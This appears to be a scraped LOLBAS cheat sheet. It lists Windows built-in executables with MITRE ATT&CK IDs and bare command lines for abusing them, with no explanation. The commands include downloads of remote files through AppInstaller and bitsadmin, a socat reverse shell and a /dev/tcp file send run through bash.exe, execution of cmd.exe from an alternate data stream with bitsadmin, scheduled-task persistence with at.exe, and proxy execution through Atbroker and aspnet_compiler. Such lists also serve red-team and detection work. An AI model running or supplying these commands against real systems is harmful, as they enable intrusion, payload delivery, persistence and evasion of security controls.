# Source: https://lolbas-project.github.io/#

# AppInstaller.exe T1105
start ms-appinstaller://?source=https://127.0.0.1/bad.txt

# Aspnet_Compiler.exe T1127
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\asptest\ -f C:\asptest\none -u

# at.exe T1053.002
C:\Windows\System32\at.exe at 09:00 /interactive /every:m,t,w,th,f,s,su C:\Windows\System32\calc.exe

# Atbroker.exe T1218
C:\Windows\System32\Atbroker.exe /start calc.exe
C:\Windows\SysWOW64\Atbroker.exe /start calc.exe

# Bash.exe T1202
C:\Windows\System32\bash.exe -c calc.exe
C:\Windows\System32\bash.exe -c "socat tcp-connect:127.0.0.1:80 exec:sh,pty,stderr,setsid,sigint,sane"
C:\Windows\System32\bash.exe -c 'cat calc.exe > /dev/tcp/127.0.0.1/24'

# Bitsadmin.exe T1564.004
C:\Windows\System32\bitsadmin.exe /create myfile
C:\Windows\System32\bitsadmin.exe /addfile myfile c:\windows\system32\notepad.exe c:\notepad.exe
C:\Windows\System32\bitsadmin.exe /SetNotifyCmdLine myfile c:\ADS\1.txt:cmd.exe NULL
C:\Windows\System32\bitsadmin.exe /RESUME myfile


# Bitsadmin.exe T1105
C:\Windows\System32\bitsadmin.exe /create 1 
C:\Windows\System32\bitsadmin.exe /addfile 1 https://live.sysinternals.com/autoruns.exe c:\autoruns.exe 
C:\Windows\System32\bitsadmin.exe /RESUME 1
C:\Windows\System32\bitsadmin.exe /complete 1

# Bitsadmin.exe T1105
C:\Windows\System32\bitsadmin.exe /create 1
C:\Windows\System32\bitsadmin.exe /addfile 1 c:\windows\system32\cmd.exe c:\cmd.exe
C:\Windows\System32\bitsadmin.exe /RESUME 1
C:\Windows\System32\bitsadmin.exe /Complete 1
C:\Windows\System32\bitsadmin.exe /reset

# Bitsadmin.exe T1218
C:\Windows\System32\bitsadmin.exe /create 1
C:\Windows\System32\bitsadmin.exe /addfile 1 c:\windows\system32\cmd.exe c:\cmd.exe
C:\Windows\System32\bitsadmin.exe /SetNotifyCmdLine 1 c:\cmd.exe NULL
C:\Windows\System32\bitsadmin.exe /RESUME 1
C:\Windows\System32\bitsadmin.exe /Reset

